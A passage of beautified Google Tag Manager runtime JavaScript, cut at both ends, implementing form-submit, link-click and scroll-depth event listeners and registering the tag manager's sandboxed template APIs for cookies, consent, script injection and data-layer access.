                        d.setAttribute(
                          "validate",
                          g.getAttribute("formvalidate")
                        )),
                      g.hasAttribute("formtarget") &&
                        ((n.target = d.getAttribute("target")),
                        d.setAttribute(
                          "target",
                          g.getAttribute("formtarget")
                        ))),
                      b.call(d),
                      m &&
                        (d.removeChild(m),
                        n.hasOwnProperty("action") && oc(d, n.action),
                        n.hasOwnProperty("enctype") &&
                          d.setAttribute("enctype", n.enctype),
                        n.hasOwnProperty("method") &&
                          d.setAttribute("method", n.method),
                        n.hasOwnProperty("validate") &&
                          d.setAttribute("validate", n.validate),
                        n.hasOwnProperty("target") &&
                          d.setAttribute("target", n.target));
                  }
                },
                e,
                f,
                g
              )
                ? ((k = !1), c.returnValue)
                : (e ||
                    (c.preventDefault && c.preventDefault(),
                    (c.returnValue = !1)),
                  !1);
            },
            !1
          ),
          (HTMLFormElement.prototype.submit = function () {
            var c = this,
              d = !0;
            GB(
              c,
              function () {
                d && b.call(c);
              },
              !1,
              IB(c)
            ) && (b.call(c), (d = !1));
          });
      };
    function KB(a, b) {
      var c = this;
      K(this.getName(), ["options:?PixieMap", "triggerId:?*"], arguments);
      var d = a && a.get("waitForTags");
      tz([
        function () {
          N(c, "detect_form_submit_events", { waitForTags: !!d });
        },
      ]);
      var e = a && a.get("checkValidation");
      if (((b = zz(b)), d)) {
        var f = Number(a.get("waitForTagsTimeout"));
        (f > 0 && isFinite(f)) || (f = 2e3);
        var g = function (m) {
          return Math.max(f, m);
        };
        Ez("fsl", "mwt", g, 0), e || Ez("fsl", "nv.mwt", g, 0);
      }
      var k = function (m) {
        return m.push(b), m;
      };
      return (
        Ez("fsl", "ids", k, []),
        e || Ez("fsl", "nv.ids", k, []),
        Az("fsl", "init", !1) || (JB(), Bz("fsl", "init", !0)),
        b
      );
    }
    function PB() {}
    (KB.J = "internal.enableAutoEventOnFormSubmit"),
      (PB.J = "internal.enableAutoEventOnGaSend");
    function YB(a, b) {
      return b;
    }
    YB.J = "internal.enableAutoEventOnHistoryChange";
    var dC,
      eC,
      ZB = ["http://", "https://", "javascript:", "file://"],
      aC = function (a, b) {
        for (
          var c = Si(
              Yi(
                (b.attributes && b.attributes.formaction ? b.formAction : "") ||
                  b.action ||
                  Pc(b, "href") ||
                  b.src ||
                  b.code ||
                  b.codebase ||
                  ""
              ),
              "host"
            ),
            d = 0;
          d < a.length;
          d++
        )
          try {
            if (new RegExp(a[d]).test(c)) return !1;
          } catch (e) {}
        return !0;
      },
      bC = function () {
        function a(c) {
          var d = c.target;
          if (
            d &&
            3 !== c.which &&
            !(c.j || (c.timeStamp && c.timeStamp === b))
          ) {
            if (((b = c.timeStamp), !(d = Jc(d, ["a", "area"], 100))))
              return c.returnValue;
            var g,
              e = c.defaultPrevented || !1 === c.returnValue,
              f = Az("lcl", e ? "nv.mwt" : "mwt", 0);
            g = Az("lcl", e ? "nv.ids" : "ids", []);
            for (var k = [], m = 0; m < g.length; m++) {
              var n = g[m],
                p = Az("lcl", "aff.map", {})[n];
              (p && !aC(p, d)) || k.push(n);
            }
            if (k.length) {
              var q = (function (a, b) {
                  if (
                    2 === a.which ||
                    a.ctrlKey ||
                    a.shiftKey ||
                    a.altKey ||
                    a.metaKey
                  )
                    return !1;
                  var c = Pc(b, "href");
                  if (
                    -1 !== c.indexOf(":") &&
                    !ZB.some(function (k) {
                      return Hb(c, k);
                    })
                  )
                    return !1;
                  var d = c.indexOf("#"),
                    e = Pc(b, "target");
                  return !(
                    (e && "_self" !== e && "_parent" !== e && "_top" !== e) ||
                    0 === d ||
                    (d > 0 && Vi(Yi(c)) === Vi(Yi(G.location.href)))
                  );
                })(c, d),
                r = Fz(d, "gtm.linkClick", k);
              if (
                ((r["gtm.elementText"] = Hc(d)),
                (r["gtm.willOpenInNewWindow"] = !q),
                q && !e && f && d.href)
              ) {
                var t = !!sb(
                    String(Pc(d, "rel") || "").split(" "),
                    function (x) {
                      return "noreferrer" === x.toLowerCase();
                    }
                  ),
                  u = G[(Pc(d, "target") || "_self").substring(1)],
                  v = !0,
                  w = py(function () {
                    var x;
                    if ((x = v && u)) {
                      var y;
                      a: if (t) {
                        var B;
                        try {
                          B = new MouseEvent(c.type, { bubbles: !0 });
                        } catch (A) {
                          if (!H.createEvent) {
                            y = !1;
                            break a;
                          }
                          (B = H.createEvent("MouseEvents")).initEvent(
                            c.type,
                            !0,
                            !0
                          );
                        }
                        (B.j = !0), c.target.dispatchEvent(B), (y = !0);
                      } else y = !1;
                      x = !y;
                    }
                    x && (u.location.href = Pc(d, "href"));
                  }, f);
                if (!oy(r, w, f))
                  return (
                    c.preventDefault && c.preventDefault(), (c.returnValue = !1)
                  );
                v = !1;
              } else oy(r, function () {}, f || 2e3);
              return !0;
            }
          }
        }
        var b = 0;
        Ec(H, "click", a, !1), Ec(H, "auxclick", a, !1);
      };
    function cC(a, b) {
      var c = this;
      K(this.getName(), ["dustOptions:?PixieMap", "triggerId:?*"], arguments);
      var d = J(a);
      tz([
        function () {
          N(c, "detect_link_click_events", d);
        },
      ]);
      var e = d && !!d.waitForTags,
        f = d && !!d.checkValidation,
        g = d ? d.affiliateDomains : void 0;
      if (((b = zz(b)), e)) {
        var k = Number(d.waitForTagsTimeout);
        (k > 0 && isFinite(k)) || (k = 2e3);
        var m = function (p) {
          return Math.max(k, p);
        };
        Ez("lcl", "mwt", m, 0), f || Ez("lcl", "nv.mwt", m, 0);
      }
      var n = function (p) {
        return p.push(b), p;
      };
      return (
        Ez("lcl", "ids", n, []),
        f || Ez("lcl", "nv.ids", n, []),
        g &&
          Ez(
            "lcl",
            "aff.map",
            function (p) {
              return (p[b] = g), p;
            },
            {}
          ),
        Az("lcl", "init", !1) || (bC(), Bz("lcl", "init", !0)),
        b
      );
    }
    cC.J = "internal.enableAutoEventOnLinkClick";
    var fC = function (a) {
        return Az("sdl", a, {});
      },
      gC = function (a, b, c) {
        if (b) {
          var d = Array.isArray(a) ? a : [a];
          Ez(
            "sdl",
            c,
            function (e) {
              for (var f = 0; f < d.length; f++) {
                var g = String(d[f]);
                e.hasOwnProperty(g) || (e[g] = []), e[g].push(b);
              }
              return e;
            },
            {}
          );
        }
      },
      iC = function (a, b) {
        Az("sdl", "init", !1) &&
          !lC() &&
          (Fc(G, b ? "scrollend" : "scroll", a),
          Fc(G, "resize", a),
          Bz("sdl", "init", !1));
      },
      hC = function () {
        var a = dC(),
          b = a.jh,
          c = a.kh,
          d = (b / eC.scrollWidth) * 100,
          e = (c / eC.scrollHeight) * 100;
        mC(b, "horiz.pix", "PIXELS", "horizontal"),
          mC(d, "horiz.pct", "PERCENT", "horizontal"),
          mC(c, "vert.pix", "PIXELS", "vertical"),
          mC(e, "vert.pct", "PERCENT", "vertical"),
          Bz("sdl", "pending", !1);
      },
      mC = function (a, b, c, d) {
        var g,
          e = fC(b),
          f = {};
        for (g in e)
          if ((((f = { Cd: f.Cd }).Cd = g), e.hasOwnProperty(f.Cd))) {
            var k = Number(f.Cd);
            if (!(a < k)) {
              var m = {};
              ny(
                ((m.event = "gtm.scrollDepth"),
                (m["gtm.scrollThreshold"] = k),
                (m["gtm.scrollUnits"] = c.toLowerCase()),
                (m["gtm.scrollDirection"] = d),
                (m["gtm.triggers"] = e[f.Cd].join(",")),
                m)
              ),
                Ez(
                  "sdl",
                  b,
                  (function (n) {
                    return function (p) {
                      return delete p[n.Cd], p;
                    };
                  })(f),
                  {}
                );
            }
          }
      },
      nC = function () {
        var a = 0,
          b = 0;
        return function () {
          var c = as(),
            d = c.height;
          return (
            (a = Math.max(eC.scrollLeft + c.width, a)),
            (b = Math.max(eC.scrollTop + d, b)),
            { jh: a, kh: b }
          );
        };
      },
      lC = function () {
        return !!(
          Object.keys(fC("horiz.pix")).length ||
          Object.keys(fC("horiz.pct")).length ||
          Object.keys(fC("vert.pix")).length ||
          Object.keys(fC("vert.pct")).length
        );
      };
    function pC(a, b) {
      var c = this;
      if (
        (K(this.getName(), ["options:!PixieMap", "triggerId:?*"], arguments),
        tz([
          function () {
            N(c, "detect_scroll_events");
          },
        ]),
        Ez(
          "sdl",
          "scr",
          function (a) {
            return (
              a || (a = H.scrollingElement || (H.body && H.body.parentNode)),
              (eC = a)
            );
          },
          !1
        ),
        Ez(
          "sdl",
          "depth",
          function (a) {
            return a || (a = nC()), (dC = a);
          },
          !1
        ),
        eC)
      ) {
        b = zz(b);
        var d = J(a);
        switch (d.horizontalThresholdUnits) {
          case "PIXELS":
            gC(d.horizontalThresholds, b, "horiz.pix");
            break;
          case "PERCENT":
            gC(d.horizontalThresholds, b, "horiz.pct");
        }
        switch (d.verticalThresholdUnits) {
          case "PIXELS":
            gC(d.verticalThresholds, b, "vert.pix");
            break;
          case "PERCENT":
            gC(d.verticalThresholds, b, "vert.pct");
        }
        return (
          Az("sdl", "init", !1)
            ? Az("sdl", "pending", !1) ||
              I(function () {
                hC();
              })
            : (Bz("sdl", "init", !0),
              Bz("sdl", "pending", !0),
              I(function () {
                if ((hC(), lC())) {
                  var e = (function () {
                    function a() {
                      f ? (e = G.setTimeout(a, c)) : ((e = 0), hC(), iC(b)),
                        (f = !1);
                    }
                    function b() {
                      d && dC(),
                        e
                          ? (f = !0)
                          : ((e = G.setTimeout(a, c)),
                            Bz("sdl", "pending", !0));
                    }
                    var c = 250,
                      d = !1;
                    H.scrollingElement &&
                      H.documentElement &&
                      ((c = 50), (d = !0));
                    var e = 0,
                      f = !1;
                    return b;
                  })();
                  "onscrollend" in G
                    ? ((e = function a() {
                        hC(), iC(a, !0);
                      }),
                      Ec(G, "scrollend", e))
                    : Ec(G, "scroll", e),
                    Ec(G, "resize", e);
                } else Bz("sdl", "init", !1);
              })),
          b
        );
      }
    }
    function rC(a, b) {
      return b;
    }
    (pC.J = "internal.enableAutoEventOnScroll"),
      (rC.J = "internal.enableAutoEventOnTimer");
    var ic = ja(["data-gtm-yt-inspected-"]);
    function FC(a, b) {
      return b;
    }
    function GC(a, b) {
      K(
        this.getName(),
        ["booleanExpression:!string", "context:?PixieMap"],
        arguments
      );
      b && J(b);
      return !1;
    }
    function IC(a) {
      return !1;
    }
    (FC.J = "internal.enableAutoEventOnYouTubeActivity"),
      (GC.J = "internal.evaluateBooleanExpression"),
      (IC.J = "internal.evaluateMatchingRules");
    var KC = function (a) {
        for (
          var b = (function (a) {
              switch (a) {
                case "page_view":
                  return [ur, tr, lr, Cu, Zt, ku, vu, wu, ou];
                case "call_conversion":
                  return [tr, Cu];
                case "conversion":
                  return [
                    qr,
                    tr,
                    cu,
                    Ut,
                    fu,
                    Vt,
                    Wt,
                    Xt,
                    Yt,
                    Zt,
                    ku,
                    lu,
                    nu,
                    pu,
                    zu,
                    Au,
                    mu,
                    vu,
                    wu,
                    gu,
                    qu,
                    ru,
                    tu,
                    du,
                    hu,
                    xu,
                    ur,
                    rr,
                    iu,
                    uu,
                    $t,
                    ou,
                    eu,
                    Bu,
                    ju,
                    su,
                    bu,
                    au,
                    yu,
                  ];
                case "landing_page":
                  return [
                    qr,
                    tr,
                    cu,
                    Ut,
                    ku,
                    sr,
                    vu,
                    wu,
                    gu,
                    du,
                    rr,
                    ur,
                    iu,
                    $t,
                    ou,
                    eu,
                    Bu,
                    yu,
                  ];
                case "remarketing":
                  return [
                    qr,
                    tr,
                    cu,
                    Ut,
                    fu,
                    Vt,
                    Wt,
                    Xt,
                    Yt,
                    Zt,
                    ku,
                    lu,
                    pu,
                    mu,
                    vu,
                    wu,
                    gu,
                    qu,
                    du,
                    rr,
                    ur,
                    iu,
                    uu,
                    $t,
                    ou,
                    eu,
                    Bu,
                    bu,
                    yu,
                  ];
                case "user_data_lead":
                case "user_data_web":
                  return [
                    qr,
                    tr,
                    cu,
                    Ut,
                    Vt,
                    Zt,
                    ku,
                    mu,
                    vu,
                    wu,
                    sr,
                    gu,
                    tu,
                    du,
                    rr,
                    ur,
                    iu,
                    uu,
                    $t,
                    ou,
                    eu,
                    Bu,
                    yu,
                  ];
                default:
                  return [
                    qr,
                    tr,
                    cu,
                    Ut,
                    fu,
                    Vt,
                    Wt,
                    Xt,
                    Yt,
                    Zt,
                    ku,
                    lu,
                    nu,
                    pu,
                    zu,
                    Au,
                    mu,
                    vu,
                    wu,
                    gu,
                    qu,
                    ru,
                    tu,
                    du,
                    hu,
                    xu,
                    rr,
                    ur,
                    iu,
                    uu,
                    $t,
                    ou,
                    eu,
                    Bu,
                    ju,
                    su,
                    bu,
                    au,
                    yu,
                  ];
              }
            })(a.metadata.hit_type),
            c = 0;
          c < b.length && (b[c](a), !a.isAborted);
          c++
        );
      },
      LC = function (a, b, c, d) {
        var e = new YA(b, c, d);
        return (
          (e.metadata.hit_type = a),
          (e.metadata.speculative = !0),
          (e.metadata.event_start_timestamp_ms = Cb()),
          (e.metadata.speculative_in_message = d.eventMetadata.speculative),
          e
        );
      };
    function kE(a, b, c, d) {}
    function lE(a) {
      var b;
      K(this.getName(), ["javascript:!string"], arguments),
        N(this, "unsafe_run_arbitrary_javascript");
      try {
        var c = G.google_tag_manager;
        c && "function" == typeof c.e && (b = c.e(a));
      } catch (d) {}
      return fd(b, this.F, 1);
    }
    function mE(a) {}
    (kE.J = "internal.executeEventProcessor"),
      (lE.J = "internal.executeJavascriptString");
    function oE() {
      return new Za();
    }
    function pE(a, b) {
      return (
        (b = void 0 === b || b),
        K(this.getName(), ["name:!string", "decode:?boolean"], arguments),
        N(this, "get_cookies", a),
        fd(no(a, void 0, !!b), this.F)
      );
    }
    function qE() {
      return Sk();
    }
    function rE() {
      return fd([]);
    }
    function sE(a, b) {
      return null;
    }
    function tE(a) {
      return null;
    }
    function uE(a) {
      return "";
    }
    function vE(a, b) {
      return null;
    }
    function wE(a) {}
    function xE(a) {
      return 0;
    }
    function yE(a) {
      return null;
    }
    function zE(a) {
      var c;
      K(this.getName(), ["keyPath:!string"], arguments),
        N(this, "read_event_data", a);
      a: {
        var d = a,
          e = xz(this).originalEventData;
        if (e) {
          for (
            var f = e,
              g = {},
              k = {},
              m = {},
              n = [],
              p = d.split("\\\\"),
              q = 0;
            q < p.length;
            q++
          ) {
            for (var r = p[q].split("\\."), t = 0; t < r.length; t++) {
              for (var u = r[t].split("."), v = 0; v < u.length; v++)
                n.push(u[v]), v !== u.length - 1 && n.push(m);
              t !== r.length - 1 && n.push(k);
            }
            q !== p.length - 1 && n.push(g);
          }
          for (
            var w = [], x = "", y = ma(n), B = y.next();
            !B.done;
            B = y.next()
          ) {
            var A = B.value;
            A === m
              ? (w.push(x), (x = ""))
              : (x = A === g ? x + "\\" : A === k ? x + "." : x + A);
          }
          x && w.push(x);
          for (var C = ma(w), E = C.next(); !E.done; E = C.next()) {
            if (null == f) {
              c = void 0;
              break a;
            }
            f = f[E.value];
          }
          c = f;
        } else c = void 0;
      }
      return fd(c, this.F, 1);
    }
    (oE.T = "getContainerVersion"),
      (pE.T = "getCookieValues"),
      (qE.J = "internal.getCountryCode"),
      (rE.J = "internal.getDestinationIds"),
      (sE.J = "internal.getElementAttribute"),
      (tE.J = "internal.getElementById"),
      (uE.J = "internal.getElementInnerText"),
      (vE.J = "internal.getElementProperty"),
      (wE.J = "internal.getElementValue"),
      (xE.J = "internal.getElementVisibilityRatio"),
      (yE.J = "internal.getElementsByCssSelector"),
      (zE.J = "internal.getEventData");
    var AE = {};
    function BE() {
      return fd(AE);
    }
    function CE() {
      return new cd(Wy);
    }
    function DE(a, b) {}
    function EE(a, b) {}
    function FE(a, b) {}
    function GE(a) {
      return "";
    }
    function HE() {
      return Tk();
    }
    function IE(a, b) {}
    function JE(a) {
      return "";
    }
    (AE.enableAWFledge = U(26)),
      (AE.enableAdsConversionValidation = U(14)),
      (AE.enableAutoPiiOnPhoneAndAddress = U(25)),
      (AE.enableCachedEcommerceData = U(32)),
      (AE.enableCcdPreAutoPiiDetection = U(33)),
      (AE.enableCloudRecommentationsErrorLogging = U(34)),
      (AE.enableCloudRecommentationsSchemaIngestion = U(35)),
      (AE.enableCloudRetailInjectPurchaseMetadata = U(37)),
      (AE.enableCloudRetailLogging = U(36)),
      (AE.enableCloudRetailPageCategories = U(38)),
      (AE.enableConsentDisclosureActivity = U(39)),
      (AE.enableConversionMarkerPageViewRename = U(41)),
      (AE.enableDCFledge = U(45)),
      (AE.enableDecodeUri = U(62)),
      (AE.enableDeferAllEnhancedMeasurement = U(46)),
      (AE.enableDmaBlockDisclosure = U(48)),
      (AE.enableEuidAutoMode = U(53)),
      (AE.enableFormSkipValidation = U(58)),
      (AE.enableUrlDecodeEventUsage = U(89)),
      (AE.enableZoneConfigInChildContainers = U(91)),
      (AE.useEnableAutoEventOnFormApis = U(100)),
      (AE.autoPiiEligible = Xk()),
      (BE.J = "internal.getFlags"),
      (CE.J = "internal.getHtmlId"),
      (DE.J = "internal.getProductSettingsParameter"),
      (EE.T = "getQueryParameters"),
      (FE.T = "getReferrerQueryParameters"),
      (GE.T = "getReferrerUrl"),
      (HE.J = "internal.getRegionCode"),
      (IE.J = "internal.getRemoteConfigParameter"),
      (JE.T = "getUrl");
    window, document;
    function oH(a, b, c) {}
    oH.J = "internal.gtagConfig";
    var qH = function (a, b) {
      var d = [],
        e = [a];
      return (
        (function c(f, g) {
          for (var k in f)
            if (f.hasOwnProperty(k)) {
              var m = g ? g + "." + k : k;
              Ta(f[k]) && -1 === e.indexOf(f[k])
                ? (e.push(f[k]), c(f[k], m))
                : d.push(m);
            }
          e.pop();
        })(a, b),
        d
      );
    };
    function rH(a, b) {
      K(this.getName(), ["keyOrObject:!*", "value:?*"], arguments);
      var c = null,
        d = J(a);
      if (Ta(d)) {
        for (var e = qH(d, ""), f = 0; f < e.length; f++)
          N(this, "write_data_layer", e[f]);
        c = vx(d);
      } else if ("string" == typeof d) {
        var g = J(b);
        if (Ta(g))
          for (var k = qH(g, d), m = 0; m < k.length; m++)
            N(this, "write_data_layer", k[m]);
        else N(this, "write_data_layer", d);
        c = vx(d, g);
      }
      if (c) {
        var n = xz(this);
        return Fx(c, n.eventId, oA(n)), fd(c);
      }
    }
    function sH(a, b) {}
    (rH.T = "gtagSet"), (sH.T = "injectHiddenIframe");
    jz();
    function uH(a, b, c, d, e) {}
    uH.J = "internal.injectHtml";
    var yH = {};
    function AH(a, b, c, d) {
      K(
        this.getName(),
        ["url:!string", "onSuccess:?Fn", "onFailure:?Fn", "cacheToken:?string"],
        arguments
      ),
        N(this, "inject_script", a);
      var e = this.F;
      !(function (a, b, c, d, e, f) {
        f
          ? e[f]
            ? (e[f][0].push(c), e[f][1].push(d))
            : ((e[f] = [[c], [d]]),
              Ac(
                a,
                function () {
                  for (var g = e[f][0], k = 0; k < g.length; k++) I(g[k]);
                  g.push = function (m) {
                    return I(m), 0;
                  };
                },
                function () {
                  for (var g = e[f][1], k = 0; k < g.length; k++) I(g[k]);
                  e[f] = null;
                },
                b
              ))
          : Ac(a, c, d, b);
      })(
        a,
        void 0,
        function () {
          b && b.jb(e);
        },
        function () {
          c && c.jb(e);
        },
        yH,
        d
      );
    }
    function DH(a, b, c, d) {}
    function EH(a) {
      return !0;
    }
    function FH() {
      return Vk();
    }
    function GH(a) {
      return !1;
    }
    function HH() {
      var a = (function Zg(a) {
        function b(c) {
          return function (d) {
            try {
              return c(d);
            } catch (e) {
              (Vf || Wf.qk) && a.call(this, e.message);
            }
          };
        }
        return {
          parse: b(function (c) {
            return fd(JSON.parse(c));
          }),
          stringify: b(function (c) {
            return JSON.stringify(J(c));
          }),
        };
      })(function (b) {
        xz(this).log("error", b);
      });
      return (a.T = "JSON"), a;
    }
    function IH(a) {
      return fd(void 0);
    }
    (AH.T = "injectScript"),
      (DH.J = "internal.injectScript"),
      (EH.T = "isConsentGranted"),
      (FH.J = "internal.isDmaRegion"),
      (GH.J = "internal.isEntityInfrastructure"),
      (IH.J = "internal.legacyParseUrl");
    var KH = {
      getItem: function (a) {
        return null;
      },
      setItem: function (a, b) {
        return !1;
      },
      removeItem: function (a) {},
    };
    function LH() {
      try {
        N(this, "logging");
      } catch (c) {
        return;
      }
      if (console) {
        for (
          var a = Array.prototype.slice.call(arguments, 0), b = 0;
          b < a.length;
          b++
        )
          a[b] = J(a[b], this.F);
        console.log.apply(console, a);
      }
    }
    function MH(a, b) {}
    function NH(a, b, c) {
      c = void 0 === c || c;
      return fd([]);
    }
    function OH(a) {}
    function PH(a) {}
    function QH(a, b, c) {}
    function RH(a) {
      var b = !1;
      K(this.getName(), ["permission:!string"], [a]);
      for (
        var c = Array.prototype.slice.call(arguments, 0), d = 0;
        d < c.length;
        ++d
      )
        c[d] = J(c[d], this.F, 1);
      c.unshift(this);
      try {
        N.apply(null, c), (b = !0);
      } catch (e) {
        return !1;
      }
      return b;
    }
    function SH() {
      return "";
    }
    function TH() {
      return gi.Ya;
    }
    function UH() {
      return "";
    }
    function VH(a, b) {}
    function WH(a) {
      return !0;
    }
    (LH.T = "logToConsole"),
      (MH.J = "internal.mergeRemoteConfig"),
      (NH.J = "internal.parseCookieValuesFromString"),
      (OH.T = "parseUrl"),
      (PH.J = "internal.processAsNewEvent"),
      (QH.J = "internal.pushToDataLayer"),
      (RH.T = "queryPermission"),
      (SH.T = "readCharacterSet"),
      (TH.J = "internal.readDataLayerName"),
      (UH.T = "readTitle"),
      (VH.J = "internal.registerCcdCallback"),
      (WH.J = "internal.registerDestination");
    function YH(a, b, c) {}
    function ZH(a, b) {
      return !1;
    }
    function $H(a, b) {}
    function bI(a, b, c, d) {}
    function cI(a, b, c) {}
    function dI(a, b) {}
    function eI(a) {}
    function fI(a, b, c, d) {
      d = void 0 === d || d;
      return !1;
    }
    function gI(a) {}
    function hI(a, b) {}
    function iI(a) {
      K(this.getName(), ["consentSettings:!PixieMap"], arguments);
      for (var b = a.Pb(), c = b.length(), d = 0; d < c; d++) {
        var e = b.get(d);
        e !== P.g.Eb && e !== P.g.af && N(this, "access_consent", e, "write");
      }
      var f = xz(this),
        g = f.eventId,
        k = oA(f);
      Fx(wx("consent", "default", J(a)), g, k);
    }
    function jI(a, b) {}
    function kI(a, b) {}
    function lI(a, b, c) {}
    function mI(a, b, c) {
      K(
        this.getName(),
        ["path:!string", "value:?*", "overrideExisting:?boolean"],
        arguments
      ),
        N(this, "access_globals", "readwrite", a);
      var d = a.split("."),
        e = Jb(d, [G, H]),
        f = d.pop();
      return !(!e || (void 0 !== e[f] && !c)) && ((e[f] = J(b, this.F, 2)), !0);
    }
    function nI(a, b, c) {}
    function oI(a, b, c) {}
    function pI(a, b, c, d) {}
    function qI(a, b, c) {}
    function rI(a, b) {}
    (YH.J = "internal.registerGtagCommandListener"),
      (ZH.J = "internal.removeDataLayerEventListener"),
      ($H.J = "internal.removeFormData"),
      (bI.J = "internal.sendGtagEvent"),
      (cI.T = "sendPixel"),
      (dI.J = "internal.setAnchorHref"),
      (eI.J = "internal.setContainerConsentDefaults"),
      (fI.T = "setCookie"),
      (gI.J = "internal.setCorePlatformServices"),
      (hI.J = "internal.setDataLayerValue"),
      (iI.T = "setDefaultConsentState"),
      (jI.J = "internal.setDelegatedConsentType"),
      (kI.J = "internal.setFormAction"),
      (lI.J = "internal.setInCrossContainerData"),
      (mI.T = "setInWindow"),
      (nI.J = "internal.setProductSettingsParameter"),
      (oI.J = "internal.setRemoteConfigParameter"),
      (pI.T = "sha256"),
      (qI.J = "internal.sortRemoteConfigParameters"),
      (rI.J = "internal.subscribeToCrossContainerData");
    var zI,
      sI = {};
    function uI(a, b) {
      return !1;
    }
    function vI(a) {}
    function wI(a) {}
    function xI(a, b) {}
    function yI(a) {
      K(this.getName(), ["consentSettings:!PixieMap"], arguments);
      var c,
        b = J(a);
      for (c in b) b.hasOwnProperty(c) && N(this, "access_consent", c, "write");
      var d = xz(this);
      Fx(wx("consent", "update", b), d.eventId, oA(d));
    }
    function AI(a, b, c) {
      (zI = zI || new jh()).add(a, b, c);
    }
    function BI(a, b) {
      var c = (zI = zI || new jh());
      if (c.D.hasOwnProperty(a))
        throw Error(
          "Attempting to add a private function which already exists: " +
            a +
            "."
        );
      if (c.j.hasOwnProperty(a))
        throw Error(
          "Attempting to add a private function with an existing API name: " +
            a +
            "."
        );
      c.D[a] = pb(b) ? Gg(a, b) : Hg(a, b);
    }
    (sI.getItem = function (a) {
      return null;
    }),
      (sI.setItem = function (a, b) {}),
      (sI.removeItem = function (a) {}),
      (sI.clear = function () {}),
      (sI.T = "templateStorage"),
      (uI.J = "internal.testRegex"),
      (wI.J = "internal.unsiloId"),
      (xI.J = "internal.unsubscribeFromCrossContainerData"),
      (yI.T = "updateConsentState");
    var pz,
      DI = function () {
        var a = function (c) {
            return BI(c.J, c);
          },
          b = function (c) {
            return AI(c.T, c);
          };
        return (
          b(rz),
          b(yz),
          b(MA),
          b(OA),
          b(PA),
          b(UA),
          b(WA),
          b($A),
          b(bB),
          b(oE),
          b(pE),
          b(EE),
          b(FE),
          b(GE),
          b(JE),
          b(rH),
          b(sH),
          b(AH),
          b(EH),
          b(LH),
          b(OH),
          b(RH),
          b(SH),
          b(UH),
          b(cI),
          b(fI),
          b(iI),
          b(mI),
          b(pI),
          b(sI),
          b(yI),
          b(HH()),
          AI(
            "Math",
            (function Lg() {
              for (var a = Math, b = Mg, c = {}, d = 0; d < b.length; d++) {
                var e = b[d];
                a.hasOwnProperty(e) && (c[e] = Kg(a[e].bind(a)));
              }
              return c;
            })()
          ),
          AI("Object", hh),
          AI("TestHelper", {}),
          AI("assertApi", Ig),
          AI("assertThat", Jg),
          AI("decodeUri", Ng),
          AI("decodeUriComponent", Og),
          AI("encodeUri", Pg),
          AI("encodeUriComponent", Qg),
          AI("fail", Vg),
          AI("generateRandom", Wg),
          AI("getTimestamp", Xg),
          AI("getTimestampMillis", Xg),
          AI("getType", Yg),
          AI("makeInteger", $g),
          AI("makeNumber", ah),
          AI("makeString", bh),
          AI("makeTableMap", ch),
          AI("mock", fh),
          AI("fromBase64", mE, !("atob" in G)),
          AI("localStorage", KH, !0),
          AI("toBase64", vI, !("btoa" in G)),
          a(uz),
          a(Pz),
          a(aA),
          a(hA),
          a(mA),
          a(BA),
          a(KA),
          a(NA),
          a(QA),
          a(RA),
          a(SA),
          a(TA),
          a(VA),
          a(XA),
          a(ZA),
          a(aB),
          a(cB),
          a(eB),
          a(fB),
          a(gB),
          a(hB),
          a(lB),
          a(tB),
          a(uB),
          a(FB),
          a(KB),
          a(PB),
          a(YB),
          a(cC),
          a(pC),
          a(rC),
          a(FC),
          a(GC),
          a(IC),
          a(kE),
          a(lE),
          a(qE),
          a(rE),
          a(sE),
          a(tE),
          a(uE),
          a(vE),
          a(wE),
          a(xE),
          a(yE),
          a(zE),
          a(BE),
          a(CE),
          a(DE),
          a(HE),
          a(IE),
          a(oH),
          a(uH),
          a(DH),
          a(FH),
          a(GH),
          a(IH),
          a(zA),
          a(MH),
          a(NH),
          a(PH),
          a(QH),
          a(TH),
          a(VH),
          a(WH),
          a(YH),
          a(ZH),
          a($H),
          a(bI),
          a(dI),
          a(eI),
          a(gI),
          a(hI),
          a(jI),
          a(kI),
          a(lI),
          a(nI),
          a(oI),
          a(qI),
          a(rI),
          a(uI),
          a(wI),
          a(xI),
          BI("internal.CrossContainerSchema", {}),
          BI("internal.GtagSchema", {}),
          AI("mockObject", gh),
          (function CI() {
            return function (a) {
              var b,
                c = zI;
              if (c.j.hasOwnProperty(a)) b = c.get(a, this);
              else {
                var d;
                if ((d = c.D.hasOwnProperty(a))) {
                  var e = !1,
                    f = this.F.j;
                  if (f) {
                    var g = f.hb();
                    g && 0 !== g.indexOf("__cvt_") && (e = !0);
                  } else e = !0;
                  d = e;
                }
                if (!d) throw Error(a + " is not a valid API name.");
                b = c.D.hasOwnProperty(a) ? c.D[a] : void 0;
              }
              return b;
            };
          })()
        );
      };
    encodeURI, encodeURIComponent, Array.isArray;
    var a,
      KI = function (a, b, c) {
        for (var d = {}, e = !1, f = 0; a && f < a.length; f++)
          a[f] &&
            a[f].hasOwnProperty(b) &&
            a[f].hasOwnProperty(c) &&
            ((d[a[f][b]] = a[f][c]), (e = !0));
        return e ? d : null;
      },
      TI = G.clearTimeout,
      UI = G.setTimeout,
      VI = function (a, b, c) {
        return Ac(a, b, c);
      },
      WI = function () {
        return G.location.href;
      },
      XI = function (a, b) {
        return Gi(a, b || 2);
      },
      ZI = function (a, b, c) {
        return b && (void 0 === G[a] || (c && !G[a])) && (G[a] = b), G[a];
      },
      Z = { securityGroups: {} };
    (Z.securityGroups.d = ["google"]),
      (Z.__d = function (a) {
        var b = null,
          c = null,
          d = a.vtp_attributeName;
        if ("CSS" == a.vtp_selectorType)
          try {
            var e = mh(a.vtp_elementSelector);
            e && e.length > 0 && (b = e[0]);
          } catch (f) {
            b = null;
          }
        else b = H.getElementById(a.vtp_elementId);
        return (
          b &&
            (c = d
              ? (function () {
                  if (b instanceof HTMLInputElement) {
                    var f = b;
                    if ("value" === d) return f.value;
                    if (
                      "checked" === d &&
                      ("radio" === f.type || "checkbox" === f.type)
                    )
                      return f.checked;
                  }
                  return Gc(b, d);
                })()
              : Hc(b)),
          Ab(String(b && c))
        );
      }),
      (Z.__d.C = "d"),
      (Z.__d.isVendorTemplate = !0),
      (Z.__d.priorityOverride = 0),
      (Z.__d.isInfrastructure = !0),
      (Z.__d.runInSiloedMode = !1),
      (Z.securityGroups.f = ["google"]),
      (Z.__f = function (a) {
        var b = XI("gtm.referrer", 1) || H.referrer;
        return b
          ? a.vtp_component && "URL" != a.vtp_component
            ? Si(
                Yi(String(b)),
                a.vtp_component,
                a.vtp_stripWww,
                a.vtp_defaultPages,
                a.vtp_queryKey
              )
            : Vi(Yi(String(b)))
          : String(b);
      }),
      (Z.__f.C = "f"),
      (Z.__f.isVendorTemplate = !0),
